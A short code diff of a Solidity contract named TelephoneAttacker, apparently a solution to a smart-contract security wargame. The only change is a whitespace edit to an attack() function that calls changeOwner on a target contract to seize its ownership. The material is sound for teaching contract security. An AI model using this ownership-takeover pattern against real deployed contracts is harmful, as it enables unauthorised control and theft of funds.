@@ -11,6 +11,6 @@ contract TelephoneAttacker {
     }
 
     function attack(address _owner) public {
-        (bool success, ) = address(target).call{value: 0}(abi.encodeWithSignature("changeOwner(address)", _owner));
+        (bool success,) = address(target).call{value: 0}(abi.encodeWithSignature("changeOwner(address)", _owner));
     }
 }
